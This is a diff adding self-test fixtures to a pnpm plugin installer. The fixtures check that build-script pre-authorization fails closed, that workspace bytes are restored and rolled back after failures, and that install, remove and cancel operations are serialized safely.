+      { pnpm: { onlyBuiltDependencies: ["evil-script-pkg"] } },
+      { pnpm: { dangerouslyAllowAllBuilds: true } },
+      { dependenciesMeta: { "evil-script-pkg": { built: true } } },
+    ];
+    let allRejected = true;
+    const details = [];
+    for (let index = 0; index < policies.length; index++) {
+      const { profileDir, cleanup } = makeTempProfile(`manifest-preauth-${index}`);
+      try {
+        const manifest = { name: "p", dependencies: {}, ...policies[index] };
+        writeFileSync(join(profileDir, "package.json"), JSON.stringify(manifest, undefined, 2) + "\n");
+        const { spawnFn, calls } = scriptedSpawn([]);
+        const outcome = await runInstall({
+          profile: "p",
+          spec: "some-plugin",
+          preflight: preflightStub("some-plugin"),
+          _profileDir: profileDir,
+          _spawn: spawnFn,
+        }).done;
+        const rejected = outcome.status === "failed"
+          && /pre-authorizes|would bypass/.test(outcome.detail ?? "")
+          && calls.length === 0
+          && !existsSync(pendingMarkerPath(profileDir));
+        allRejected &&= rejected;
+        if (!rejected) details.push(`${index}:${outcome.status}:${outcome.detail}:calls=${calls.length}`);
+      } finally {
+        cleanup();
+      }
+    }
+    check("package.json 四种预授权策略均在 pnpm spawn 前 fail closed", allRejected, details.join(" | "));
+  }
+
+  // 1e. 无论是安装失败、重试失败还是成功，workspace 原始字节均完整还原（不破坏用户已有策略）
+  {
+    const { profileDir, cleanup } = makeTempProfile("ws-restore-on-failure");
+    try {
+      const userCustomWs = "packages:\n  - .\n\nallowBuilds:\n  user-custom-tool: true\n";
+      writeFileSync(join(profileDir, "pnpm-workspace.yaml"), userCustomWs);
+      materializeFakePackage(profileDir, "some-plugin", "1.0.0");
+      materializeFakePackage(profileDir, "node-pty", "1.0.0", { install: "node install.js" });
+      const approvedProof = computeMaterializedProof(profileDir, "some-plugin", [{ name: "node-pty", version: "1.0.0", selector: "node-pty@1.0.0" }]);
+
+      // 重试执行失败
+      const { spawnFn, calls } = scriptedSpawn([
+        { code: 0, out: "Ignored build scripts: node-pty@1.0.0\n" },
+        { code: 1, out: "Build error\n" },
+      ]);
+      const producer = runInstall({
+        profile: "p",
+        spec: "some-plugin",
+        allowBuildScripts: ["node-pty"],
+        approvedProof,
+        preflight: preflightStub("some-plugin"),
+        _profileDir: profileDir,
+        _spawn: spawnFn,
+        _describe: describeStub,
+      });
+      const outcome = await producer.done;
+      const finalWs = readFileSync(join(profileDir, "pnpm-workspace.yaml"), "utf8");
+      check(
+        "重试执行失败 → workspace 依然完整恢复用户的 user-custom-tool 策略",
+        outcome.status === "failed" && calls.length === 2 && finalWs === userCustomWs,
+        `status=${outcome.status} calls=${calls.length} detail=${JSON.stringify(outcome.detail)} finalWs=${JSON.stringify(finalWs)}`,
+      );
+    } finally {
+      cleanup();
+    }
+  }
+
+
+  // 1f. Even when an approved rebuild itself succeeds, inability to put the
+  // user's exact workspace bytes back is terminal and forces snapshot rollback.
+  {
+    const { profileDir, manifest, cleanup } = makeTempProfile("ws-restore-hard-fail");
+    try {
+      const initialWs = "packages:\n  - .\n\nnodeLinker: hoisted\n";
+      writeFileSync(join(profileDir, "pnpm-workspace.yaml"), initialWs);
+      materializeFakePackage(profileDir, "some-plugin", "1.0.0");
+      materializeFakePackage(profileDir, "node-pty", "1.0.0", { install: "node install.js" });
+      const approvedProof = computeMaterializedProof(profileDir, "some-plugin", [{ name: "node-pty", version: "1.0.0", selector: "node-pty@1.0.0" }]);
+      const { spawnFn, calls } = scriptedSpawn([
+        { code: 0, out: "Ignored build scripts: node-pty@1.0.0\n" },
+        { code: 0, out: "Done\n" },
+      ]);
+      const outcome = await runInstall({
+        profile: "p",
+        spec: "some-plugin",
+        allowBuildScripts: ["node-pty"],
+        approvedProof,
+        preflight: preflightStub("some-plugin"),
+        _profileDir: profileDir,
+        _spawn: spawnFn,
+        _describe: describeStub,
+        _restoreWorkspace: () => { throw new Error("simulated restore denial"); },
+      }).done;
+      check(
+        "workspace 恢复写失败 → 即使 rebuild exit 0 也 terminal failed 并回滚 marker/profile",
+        outcome.status === "failed"
+          && /restor|恢复|workspace/i.test(outcome.detail ?? "")
+          && calls.length === 2
+          && readFileSync(join(profileDir, "package.json"), "utf8") === manifest
+          && readFileSync(join(profileDir, "pnpm-workspace.yaml"), "utf8") === initialWs
+          && !existsSync(pendingMarkerPath(profileDir)),
+        `status=${outcome.status} detail=${JSON.stringify(outcome.detail)} calls=${calls.length}`,
+      );
+    } finally {
+      cleanup();
+    }
+  }
+
+  // 2. finalizeSuccess 抛错（pnpm 留下了坏 manifest）：归一成 failed、回滚
+  // 恢复字节并收掉 marker、done 恰好结算一次且不拒绝。
+  {
+    const { profileDir, manifest, cleanup } = makeTempProfile("finalize-throws");
+    try {
+      materializeFakePackage(profileDir, "some-plugin", "1.0.0");
+      const { spawnFn } = scriptedSpawn([{
+        code: 0,
+        out: "Done\n",
+        beforeExit: () => writeFileSync(join(profileDir, "package.json"), "{ broken json"),
+      }]);
+      const producer = runInstall({ profile: "p", spec: "some-plugin", preflight: preflightStub("some-plugin"), _profileDir: profileDir, _spawn: spawnFn, _describe: describeStub });
+      let settlements = 0;
+      void producer.done.then(() => { settlements++; });
+      const outcome = await producer.done;
+      await flush();
+      check(
+        "finalize 抛错 → failed + 回滚恢复 package.json + marker 收掉 + 单次结算",
+        outcome.status === "failed"
+          && /reconciliation failed/.test(outcome.detail ?? "")
+          && readFileSync(join(profileDir, "package.json"), "utf8") === manifest
+          && !existsSync(pendingMarkerPath(profileDir))
+          && settlements === 1,
+        `status=${outcome.status} detail=${JSON.stringify(outcome.detail)} settlements=${settlements}`,
+      );
+    } finally {
+      cleanup();
+    }
+  }
+
+  // 3a. 串行化：install 在跑时 remove 排队，不许并发 spawn；install 失败回滚
+  // 后 remove 才执行，且因目标不是依赖而 fail-fast（仍不 spawn）。
+  {
+    const { profileDir, cleanup } = makeTempProfile("serialize");
+    try {
+      materializeFakePackage(profileDir, "pkg-a", "1.0.0");
+      const { spawnFn, procs } = blockingSpawn();
+      const install = runInstall({ profile: "p", spec: "pkg-a", preflight: preflightStub("pkg-a"), _profileDir: profileDir, _spawn: spawnFn });
+      await flush();
+      const installSpawned = procs.length === 1;
+      const remove = runRemove({ profile: "p", packageName: "pkg-a", _profileDir: profileDir, _spawn: spawnFn });
+      await flush();
+      const queuedNotSpawned = procs.length === 1;
+      procs[0].finish(1, "boom");
+      const installOutcome = await install.done;
+      const removeOutcome = await remove.done;
+      check(
+        "install/remove 串行：remove 排队等待，install 结束后才执行",
+        installSpawned
+          && queuedNotSpawned
+          && installOutcome.status === "failed"
+          && removeOutcome.status === "failed"
+          && /not a dependency/.test(removeOutcome.detail ?? "")
+          && procs.length === 1,
+        `procs=${procs.length} install=${installOutcome.status} remove=${removeOutcome.status} ${JSON.stringify(removeOutcome.detail)}`,
+      );
+    } finally {
+      cleanup();
+    }
+  }
+
+  // 3b-0. A corrupt/existing pending marker is recovery evidence. A new
+  // install must neither overwrite it nor leave its just-created snapshot.
+  {
+    const { profileDir, cleanup } = makeTempProfile("install-corrupt-pending");
+    try {
+      const marker = pendingMarkerPath(profileDir);
+      mkdirSync(dirname(marker), { recursive: true });
+      const corruptBytes = "{ deliberately-corrupt\n";
+      writeFileSync(marker, corruptBytes);
+      const { spawnFn, calls } = scriptedSpawn([]);
+      const outcome = await runInstall({
+        profile: "p",
+        spec: "some-plugin",
+        preflight: preflightStub("some-plugin"),
+        _profileDir: profileDir,
+        _spawn: spawnFn,
+      }).done;
+      const snapshotsDir = join(dirname(marker), "snapshots");
+      const leftoverSnapshots = existsSync(snapshotsDir) ? readdirSync(snapshotsDir) : [];
+      check(
+        "损坏/既有 pending marker → install 不 spawn、不覆盖证据、不遗留新 snapshot",
+        outcome.status === "failed"
+          && /already has a pending install marker/.test(outcome.detail ?? "")
+          && calls.length === 0
+          && readFileSync(marker, "utf8") === corruptBytes
+          && leftoverSnapshots.length === 0,
+        `status=${outcome.status} calls=${calls.length} snapshots=${leftoverSnapshots.join(",")} detail=${JSON.stringify(outcome.detail)}`,
+      );
+    } finally {
+      cleanup();
+    }
+  }
+
+  // 3b. pending marker 存在时 remove 拒绝对该 profile 动手（fail closed），
+  // marker 原样保留给恢复路径。
+  {
+    const { profileDir, cleanup } = makeTempProfile("pending-refuse", { "pkg-b": "1.0.0" });
+    try {
+      mkdirSync(dirname(pendingMarkerPath(profileDir)), { recursive: true });
+      writeFileSync(pendingMarkerPath(profileDir), "{}\n");
+      const { spawnFn, procs } = blockingSpawn();
+      const outcome = await runRemove({ profile: "p", packageName: "pkg-b", _profileDir: profileDir, _spawn: spawnFn }).done;
+      check(
+        "pending marker 存在 → remove 拒绝执行且不 spawn pnpm，marker 保留",
+        outcome.status === "failed"
+          && /pending install transaction/.test(outcome.detail ?? "")
+          && procs.length === 0
+          && existsSync(pendingMarkerPath(profileDir)),
+        `status=${outcome.status} procs=${procs.length} ${JSON.stringify(outcome.detail)}`,
+      );
+    } finally {
+      cleanup();
+    }
+  }
+
+  // 3c. 排队中被取消：killed 结局，pnpm 从未启动；锁随后正常释放。
+  {
+    const { profileDir, cleanup } = makeTempProfile("cancel-queued");
+    try {
+      materializeFakePackage(profileDir, "pkg-a", "1.0.0");
+      const { spawnFn, procs } = blockingSpawn();
+      const install = runInstall({ profile: "p", spec: "pkg-a", preflight: preflightStub("pkg-a"), _profileDir: profileDir, _spawn: spawnFn });
+      await flush();
+      const remove = runRemove({ profile: "p", packageName: "pkg-a", _profileDir: profileDir, _spawn: spawnFn });
+      remove.cancel();
+      procs[0]?.finish(1, "boom");
+      const installOutcome = await install.done;
+      const removeOutcome = await remove.done;
+      check(
+        "排队中取消 → killed，未 spawn；前一个任务照常完成",
+        removeOutcome.status === "killed" && procs.length === 1 && installOutcome.status === "failed",
+        `remove=${removeOutcome.status} install=${installOutcome.status} procs=${procs.length}`,
+      );
+    } finally {
+      cleanup();
+    }
+  }
+
+  // 4a. spawn 计划（纯函数）：非 Windows 无 shell；Windows 有 .exe 则
+  // shell:false，仅 .cmd 则 shell:true + treeKill，全找不到回退 "pnpm"。
+  {
+    const shimDir = mkdtempSync(join(tmpdir(), "dsh-mall-selftest-path-"));
+    try {
+      const planPosix = pnpmSpawnPlan({ platform: "linux", pathEnv: shimDir });
+      const posixOk = planPosix.command === "pnpm" && planPosix.shell === false && planPosix.treeKill === false;
+      const planMissing = pnpmSpawnPlan({ platform: "win32", pathEnv: shimDir });
+      const missingOk = planMissing.command === "pnpm" && planMissing.shell === true && planMissing.treeKill === true;
+      writeFileSync(join(shimDir, "pnpm.cmd"), "@echo off\r\n");
+      const planCmd = pnpmSpawnPlan({ platform: "win32", pathEnv: shimDir });
+      const cmdOk = planCmd.command === join(shimDir, "pnpm.cmd") && planCmd.shell === true && planCmd.treeKill === true;
+      writeFileSync(join(shimDir, "pnpm.exe"), "MZ");
+      const planExe = pnpmSpawnPlan({ platform: "win32", pathEnv: shimDir });
+      const exeOk = planExe.command === join(shimDir, "pnpm.exe") && planExe.shell === false && planExe.treeKill === false;
+      check(
+        "pnpmSpawnPlan：posix 直起 / win32 优先 .exe 无 shell / 仅 .cmd 则 treeKill",
+        posixOk && missingOk && cmdOk && exeOk,
+        JSON.stringify({ planPosix, planMissing, planCmd, planExe }),
+      );
+    } finally {
+      rmSync(shimDir, { recursive: true, force: true });
+    }
+  }
+
+  // 4b. 取消时序：cancel() → 进程 close → killed 结局 → 回滚收 marker，
+  // 回滚严格发生在进程退出之后（done 链只在 'close' 后推进）。
+  {
+    const { profileDir, cleanup } = makeTempProfile("cancel-order");
+    try {
+      materializeFakePackage(profileDir, "pkg-a", "1.0.0");
+      const { spawnFn, procs } = blockingSpawn();
+      const install = runInstall({ profile: "p", spec: "pkg-a", preflight: preflightStub("pkg-a"), _profileDir: profileDir, _spawn: spawnFn });
+      await flush();
+      const spawnedAndMarked = procs.length === 1 && existsSync(pendingMarkerPath(profileDir));
+      install.cancel();
+      const outcome = await install.done;
+      const output = (() => { let text = ""; let chunk = install.readOutput(); while (chunk.length > 0) { text += chunk; chunk = install.readOutput(); } return text; })();
+      check(
+        "取消在途 install → killed + 回滚收 marker（在进程退出之后）",
+        spawnedAndMarked
+          && outcome.status === "killed"
+          && !existsSync(pendingMarkerPath(profileDir))
+          && /restored profile files/.test(output),
+        `status=${outcome.status} marker=${existsSync(pendingMarkerPath(profileDir))}`,
+      );
+    } finally {
+      cleanup();
+    }
+  }
+
+  return failed;
+}
+
 if (process.argv[1]?.endsWith("installer.js") && process.argv.includes("--self-test")) {
   console.log("allowBuilds 合并 fixtures:");
   const failed = runAllowBuildsFixtures();
   console.log(`${ALLOW_BUILDS_FIXTURES.length - failed}/${ALLOW_BUILDS_FIXTURES.length} passed`);
-  process.exit(failed === 0 ? 0 : 1);
+  // 实装 pnpm add 的参数/环境（纯函数）：peer 自动安装必须关闭，否则
+  // marketplace 安装会把 @deepseek-ai 宿主依赖栈拉进 profile；构建脚本必须
+  // 严格，否则 pnpm 退出码 0 却跳过构建脚本，批准闸形同虚设。
+  const addArgs = liveAddArgs("some-plugin@1.0.0");
+  const argsOk = addArgs[0] === "add" && addArgs[1] === "some-plugin@1.0.0"
+    && addArgs.includes("--config.auto-install-peers=false")
+    && addArgs.includes("--config.strict-dep-builds=true");
+  const env = liveAddEnv({ KEEP_ME: "1" });
+  const envOk = env.KEEP_ME === "1"
+    && env.npm_config_auto_install_peers === "false" && env.NPM_CONFIG_AUTO_INSTALL_PEERS === "false"
+    && env.npm_config_strict_dep_builds === "true" && env.NPM_CONFIG_STRICT_DEP_BUILDS === "true";
+  console.log(`  ${argsOk && envOk ? "PASS" : "FAIL"} 实装 pnpm add：peer 自动安装关闭 + 严格构建脚本（args + env）`);
+  console.log("事务 fixtures:");
+  // 默认失败：若事件循环提前排空（Promise 不挂住进程），静默退出也算 FAIL。
+  process.exitCode = 1;
+  void runTransactionFixtures().then(
+    (txFailed) => {
+      process.exit(failed === 0 && argsOk && envOk && txFailed === 0 ? 0 : 1);
+    },
+    (error) => {
+      console.error(`  FAIL 事务 fixtures 抛错: ${error?.stack ?? error}`);
+      process.exit(1);
+    },
+  );
 }
